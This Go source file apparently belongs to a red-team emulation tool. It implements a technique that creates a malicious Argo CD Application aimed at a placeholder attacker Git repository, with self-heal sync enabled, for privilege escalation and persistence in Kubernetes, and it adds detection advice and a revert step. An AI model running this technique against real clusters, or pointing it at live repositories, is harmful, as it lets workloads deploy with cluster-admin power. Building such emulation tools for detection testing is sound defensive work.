package kubernetes

import (
	"context"
	_ "embed"
	"fmt"

	"github.com/datadog/stratus-red-team/v2/pkg/stratus"
	"github.com/datadog/stratus-red-team/v2/pkg/stratus/log"
	"github.com/datadog/stratus-red-team/v2/pkg/stratus/mitreattack"
	metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
	"k8s.io/apimachinery/pkg/apis/meta/v1/unstructured"
	"k8s.io/apimachinery/pkg/runtime/schema"
	"k8s.io/client-go/dynamic"
)

//go:embed main.tf
var tf []byte

// GroupVersionResource of the Argo CD Application custom resource
var applicationGVR = schema.GroupVersionResource{
	Group:    "argoproj.io",
	Version:  "v1alpha1",
	Resource: "applications",
}

// The attacker-controlled Git repository the rogue Application points at. This is
// an intentionally non-existent placeholder: on a local simulation no Argo CD
// controller reconciles the Application, so the repository is never cloned.
const attackerRepoURL = "https://github.com/stratus-red-team/does-not-exist"

func init() {
	stratus.GetRegistry().RegisterAttackTechnique(&stratus.AttackTechnique{
		ID:                 "k8s.privilege-escalation.create-argocd-application",
		FriendlyName:       "Create Malicious Argo CD Application",
		Platform:           stratus.Kubernetes,
		IsIdempotent:       false, // creating an Application with the same name twice fails
		MitreAttackTactics: []mitreattack.Tactic{mitreattack.PrivilegeEscalation, mitreattack.Persistence},
		Description: `
Creates a rogue Argo CD <code>Application</code> custom resource that points at an attacker-controlled Git repository.

Argo CD's application controller acts as a confused deputy: it reconciles Application resources by applying the manifests found in the referenced repository using its own, typically highly-privileged, Kubernetes credentials (often effectively cluster-admin). An attacker who can only create Application objects can therefore have arbitrary workloads deployed with the controller's permissions, without holding those permissions themselves. Enabling automated self-heal sync also provides persistence, as the controller recreates deleted resources.

This technique is designed for local simulation.

Warm-up:

- Create a namespace.
- Install a minimal Argo CD <code>Application</code> CustomResourceDefinition, so the technique can be simulated on a cluster that does not have Argo CD installed.

Detonation:

- Create an <code>argoproj.io/v1alpha1</code> <code>Application</code> that references an external Git repository, targets the in-cluster API server, and enables automated self-heal sync.

Note: because no Argo CD application controller is running in the local-simulation setup, the Application is never reconciled and no workload is actually deployed. The emulated signal is the creation of the rogue Application object itself. Against a cluster that already runs Argo CD, point the technique at the existing installation.

References:

- https://kubernetes-security.cloud/topics/weaponizing-argocd-application
- https://argo-cd.readthedocs.io/en/stable/operator-manual/rbac/
- https://argo-cd.readthedocs.io/en/stable/user-guide/projects/
`,
		Detection: `
Monitor the Kubernetes audit logs for <code>create</code> operations on <code>applications.argoproj.io</code> objects.

Alert in particular on Argo CD Applications that:
<ul>
<li>reference a <code>spec.source.repoURL</code> that is not in your approved repository allowlist;</li>
<li>enable <code>spec.syncPolicy.automated.selfHeal</code>, which the controller uses to recreate deleted resources (persistence);</li>
<li>target sensitive destination namespaces such as <code>argocd</code> or <code>kube-system</code>, or the in-cluster API server <code>https://kubernetes.default.svc</code>.</li>
</ul>

Where possible, constrain which users can create Applications through Argo CD RBAC, and restrict permitted source repositories and destinations using Argo CD AppProjects.
`,
		PrerequisitesTerraformCode: tf,
		Detonate:                   detonate,
		Revert:                     revert,
	})
}

// buildApplication returns the unstructured rogue Argo CD Application object
func buildApplication(name string, namespace string) *unstructured.Unstructured {
	return &unstructured.Unstructured{
		Object: map[string]interface{}{
			"apiVersion": "argoproj.io/v1alpha1",
			"kind":       "Application",
			"metadata": map[string]interface{}{
				"name":      name,
				"namespace": namespace,
				"labels": map[string]interface{}{
					"datadoghq.com/stratus-red-team": "true",
				},
			},
			"spec": map[string]interface{}{
				"project": "default",
				"source": map[string]interface{}{
					"repoURL":        attackerRepoURL,
					"targetRevision": "main",
					"path":           "manifests",
				},
				"destination": map[string]interface{}{
					"server":    "https://kubernetes.default.svc",
					"namespace": namespace,
				},
				"syncPolicy": map[string]interface{}{
					"automated": map[string]interface{}{
						"prune":    false,
						"selfHeal": true,
					},
				},
			},
		},
	}
}

func applicationName(params map[string]string) string {
	return fmt.Sprintf("stratus-red-team-%s", params["warmup_short_id"])
}

func detonate(params map[string]string, providers stratus.CloudProviders) error {
	namespace := params["namespace"]
	name := applicationName(params)

	client, err := dynamic.NewForConfig(providers.K8s().GetRestConfig())
	if err != nil {
		return fmt.Errorf("unable to build Kubernetes dynamic client: %w", err)
	}

	log.Println("Creating malicious Argo CD Application " + name + " in namespace " + namespace)
	_, err = client.Resource(applicationGVR).Namespace(namespace).Create(
		context.Background(), buildApplication(name, namespace), metav1.CreateOptions{},
	)
	if err != nil {
		return fmt.Errorf("unable to create Argo CD Application: %w", err)
	}

	log.Println("Successfully created Argo CD Application " + name + " pointing at " + attackerRepoURL)
	return nil
}

func revert(params map[string]string, providers stratus.CloudProviders) error {
	namespace := params["namespace"]
	name := applicationName(params)

	client, err := dynamic.NewForConfig(providers.K8s().GetRestConfig())
	if err != nil {
		return fmt.Errorf("unable to build Kubernetes dynamic client: %w", err)
	}

	log.Println("Deleting Argo CD Application " + name + " in namespace " + namespace)
	err = client.Resource(applicationGVR).Namespace(namespace).Delete(
		context.Background(), name, metav1.DeleteOptions{},
	)
	if err != nil {
		return fmt.Errorf("unable to delete Argo CD Application: %w", err)
	}

	return nil
}
